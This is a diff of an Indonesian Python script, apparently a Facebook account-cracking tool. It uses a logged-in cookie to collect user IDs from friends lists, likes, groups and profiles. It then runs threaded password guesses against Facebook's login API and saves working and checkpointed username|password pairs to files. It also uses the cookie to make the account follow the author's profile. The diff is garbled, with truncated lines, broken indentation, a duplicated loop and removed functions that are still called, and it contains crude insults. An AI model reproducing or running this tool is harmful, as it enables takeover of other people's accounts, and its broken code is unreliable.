@@ -1,18 +1,18 @@
-#!/usr/bin/env python3    
+#!/usr/bin/env python3
 # -*- coding: utf-8 -*-
-#Males gw encrypt Tod jika mau recode, recode aja            
+#Males gw encrypt Tod jika mau recode, recode aja
 #Tapi ngotak dikit jangan Lo jual belikan sc ini kontol
-#Code by PutraDD                                             
+#Code by PutraDD
 #Created 13-06-2024
 #My facebook (https://www.facebook.com/bang.madoon)
-
 
 import os,sys,re,time,json,random,requests
 from bs4 import BeautifulSoup as parser
 from concurrent.futures import ThreadPoolExecutor
 
 def croot():
-    os.system("git pull")                                                                                                            def ikeh_ikeh_kimochi():
+    os.system("git pull")
+def ikeh_ikeh_kimochi():
     os.system("clear")
 def aahh(s):
     for c in s + '\n':
@@ -49,10 +49,13 @@ def jembut():
 def putradd():
     putra=input("\n\033[00m\t   [\033[96m Press Enter To Return\033[97m ] ")
     if putra == "":
-       os.system("python Lodes.py")                                                                                                      else:
+       os.system("python Lodes.py")
+    else:
        sys.exit("\n\033[1;97m [\033[1;91m•\033[1;97m] \033[1;91mGood Byee :')")
-def moch_putra():                                                                                                                        time.sleep(0.1)
-    print("\033[97m [\033[96m01\033[97m] Start  Lodes ID")                                                                               print("\033[97m [\033[96m02\033[97m] Tutor  How to Get Fb Cookies")
+def moch_putra():
+    time.sleep(0.1)
+    print("\033[97m [\033[96m01\033[97m] Start  Lodes ID")
+    print("\033[97m [\033[96m02\033[97m] Tutor  How to Get Fb Cookies")
     print("\033[97m [\033[96m03\033[97m] Joined Grup Fb ❤️ Duda ERROR ❤️")
     print("\033[97m [\033[96m04\033[97m] Joined Grup Fb Viral")
     print("\033[97m [\033[96m05\033[97m] Update Tools")
@@ -61,7 +64,7 @@ def moch_putra():                                                               
     print("\x1b[1;94m▀▄ ▄▀ ▀▄ ▄▀ ▀▀ ▀▀ ▀▀ ▀▀ ▀▀ █▄▀")
     time.sleep(0.1)
 
-    putra=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
+putra=input("\x1b[1;97m [\x1b[1;94m•\x1b[1;91m•\x1b[1;97m] \033[90m►\033[1;93m ")
     if putra == "1" or putra =="01":
          mbasic = 'https://mbasic.facebook.com{}'
          global die,check,result, count
@@ -86,12 +89,14 @@ def moch_putra():                                                               
                      if "Apo yang kau pikir kan kontol" in str(ismi):
                              with open("cookies","w") as f:
                                      f.write(cek["cookie"])
-                     else:
+                          else:
                            print("\033[1;97m[\033[1;94m•\033[1;97m] \033[00mUbah bahasa, harap tunggu\033[1;91m!!\033[00m")
                            try:
-                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"])>                           except:
+                                  requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
+                           except:
                                   pass
-                     try:                                                                                                                                         ikuti = parser(requests.get(mbasic.format("/https://www.facebook.com/bang.madoon"),cookies=cek).content>
+                     try:
+                             ikuti = parser(requests.get(mbasic.format("/https://www.facebook.com/bang.madoon"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
                              ses.get(mbasic.format(ikuti),cookies=cek)
                      except :
                              pass
@@ -114,7 +119,7 @@ def moch_putra():                                                               
                      'password': password,
                      'sdk': 'ios',
                      'generate_session_cookies': '1',
-                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',
+                     'sig': '3f555f99fb61fcd7aa0c44f58f522ef6',       
              }
              api = 'https://b-api.facebook.com/method/auth.login'
              response = requests.get(api, params=params)
@@ -134,10 +139,12 @@ def moch_putra():                                                               
                    if cek:
                            chek.append(username+"|"+password)
                    else:
-                           with open('cp.txt','a') as f:                                                                                                             f.write(username + '|' + password + '\n')
+                           with open('cp.txt','a') as f:
+                                f.write(username + '|' + password + '\n')
              else:
-                   die += 1                                                                                                                       for i in list('\|/-•'):
-                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \>
+                   die += 1
+             for i in list('\|/-•'):
+                            print(f"\r\033[00m [\033[1;91m{i}\033[00m] ok : \033[90m(\033[1;92m{str(result)}\033[90m) \033[00mcp : \033[90m(\033[1;93m{str(check)}\033[90m) \033[00mdie : \033[90m(\033[1;94m{str(die)}\033[90m)\033[00m",end="")
                             time.sleep(0.2)
          def getid(url):
              raw = requests.get(url,cookies=kuki).content
@@ -149,7 +156,7 @@ def moch_putra():                                                               
                         continue
                  else:
                         id.append(x[1] + '|' + x[0].split('/')[1].split('?')[0])
-                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProcess Of Retrieving ID... ",>
+                 print('\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m' + str(len(id)) + " \033[1;97mProcess Of Retrieving ID... ",end="")
              if 'Lihat Teman Lain' in str(raw):
                  getid(mbasic.format(parser(raw,'html.parser').find('a',string='Lihat Teman Lain')['href']))
              return id
@@ -167,36 +174,13 @@ def moch_putra():                                                               
              for user in ids:
                  if 'profile' in user[0]:
                          id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
-                     else:
+                 else:
                          id.append(user[1] + "|" + user[0].split('/')[1])
-                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end=">
+                    
+                 print(f'\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ',end="")
              if 'Lihat Selengkapnya' in str(like):
                  getlike(mbasic.format(parser(like,'html.parser').find('a',string="Lihat Selengkapnya")["href"]))
-             return id
-         def bysearch(option):
-             search = requests.get(option,cookies=kuki).content
-             users = re.findall('class="x ch"><a href="/(.*?)"><div.*?class="cj">(.*?)</div>',str(search))
-             for user in users:
-                  if "profile" in user[0]:
-                         id.append(user[1] + "|" + re.findall("=(\d*)",str(user[0]))[0])
-                  else:
-                         id.append(user[1] + "|" + user[0].split("?")[0])
-                  print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end=>
-             if "Lihat Hasil Selanjutnya" in str(search):
-                  bysearch(parser(search,'html.parser').find("a",string="Lihat Hasil Selanjutnya")["href"])
-             return id
-         def grubid(endpoint):
-             grab = requests.get(endpoint,cookies=kuki).content
-             users = re.findall('a class=".." href="/(.*?)">(.*?)</a>',str(grab))
-             for user in users:
-                 if "profile" in user[0]:
-                         id.append(user[1] + "|" + re.findall('id=(\d*)',str(user[0]))[0])
-                 else:
-                         id.append(user[1] + "|" + user[0])
-                 print(f"\r\033[1;97m [\033[1;94m•\033[1;97m] \033[1;96m{str(len(id))} \033[1;97mProcess Of Retrieving ID... ",end=">
-             if "Lihat Selengkapnya" in str(grab):
-                 grubid(mbasic.format(parser(grab,"html.parser").find("a",string="Lihat Selengkapnya")["href"]))
-             return id
+                 return id
          if __name__ == '__main__':
                try:
                    ses = requests.Session()
@@ -236,7 +220,7 @@ def moch_putra():                                                               
                          os.system("rm -rf cookies")
                          print("\n\x1b[1;97m [\x1b[1;92m√\x1b[1;97m]\x1b[1;92m Deleted Successfully!")
                          putradd()
-                       elif memek == '1' or memek =='01':
+                   elif memek == '1' or memek =='01':
                          url = parser(ses.get(mbasic.format('/me'),cookies=kuki).content,'html.parser').find('a',string='Teman')
                          username = getid(mbasic.format(url["href"]))
                    elif memek == '2' or memek =='02':
@@ -257,14 +241,16 @@ def moch_putra():                                                               
                          print("\033[1;97m\n [\033[1;94m•\033[1;97m] Can Only Take \033[91m100 \033[00mID ")
                          grab = input("\033[1;97m[\033[1;96m?\033[1;97m] \033[00mID group \033[1;91m: \033[1;92m")
                          username = grubid(mbasic.format("/browse/group/members/?id=" + grab))
-                         if len(username) == 0:                                                                                                                       exit("\033[00m[\033[91m!\033[00m] Group ID None!")
+                         if len(username) == 0:
+                                 exit("\033[00m[\033[91m!\033[00m] Group ID None!")
                    elif memek == '5' or memek =='05':
-                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")                                               if knf.isdigit():
+                         knf = input("\033[1;97m\n [\033[1;96m?\033[1;97m] Username/Id \033[1;91m: \033[1;92m")
+                         if knf.isdigit():
                                  user = "/profile.php?id=" + knf
                          else:
                                  user = "/" + knf
                          try:
-                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string>
+                                 user = parser(requests.get(mbasic.format(user),cookies=kuki).content,"html.parser").find('a',string="Teman")["href"]
                                  username = getid(mbasic.format(user))
                          except TypeError:
                                  exit("\033[00m[\033[91m!\033[00m] \033[97mUser/ID Wrong!")
@@ -278,6 +264,7 @@ def moch_putra():                                                               
                                  print(f"\033[97m\n [\033[93m{str(len(final))}\033[97m] Account To Check ")
                                  with ThreadPoolExecutor(max_workers=10) as ex:
                                          for user in final:
+                                             for user in final:
                                                  a = user.split("|")
                                                  ex.submit(login,(a[0]),(a[1]),(True))
                                  for x in result:
@@ -299,7 +286,7 @@ def moch_putra():                                                               
                    jembut()
                    print('\n\x1b[1;96m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                    print('\x1b[1;95m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••──>
+                   print('\x1b[1;97m           Total ID\x1b[1;91m :\x1b[1;92m ' + str(len(id)) + "\n\x1b[1;95m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="") 
                    expass = input("\n\033[1;97m [\033[1;96m?\033[1;97m] Add Password1 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password2 \033[1;91m: \033[1;92m")
                    expass = input("\033[1;97m [\033[1;96m?\033[1;97m] Add Password3 \033[1;91m: \033[1;92m")
@@ -308,8 +295,8 @@ def moch_putra():                                                               
                    jembut()
                    print('\n\x1b[1;92m        ✰★✰╭⍝╮⎝҂⚆⏝⚆⍀⎠╭⍝╮✰★✰')
                    print('\x1b[1;97m     疊╔═╦═────••♽••─────═╦═╗疊')
-                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••──>
-                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1>
+                   print('\x1b[1;96m           Total ID\x1b[1;91m :\x1b[1;94m ' + str(len(id)) + "\n\x1b[1;97m     疊╚═╩═────••♽••─────═╩═╝疊\n",end="")
+                   print('\n\x1b[1;97m [\x1b[1;92m+\x1b[1;97m] the result\x1b[1;92m OK\x1b[1;97m saved to : ok.txt\n [\x1b[1;93m-\x1b[1;97m] the result>
                    print('\n [\x1b[1;91m!\x1b[1;97m] turn off data to stop the process\n')
                    with ThreadPoolExecutor(max_workers=30) as ex:
                           for user in username:
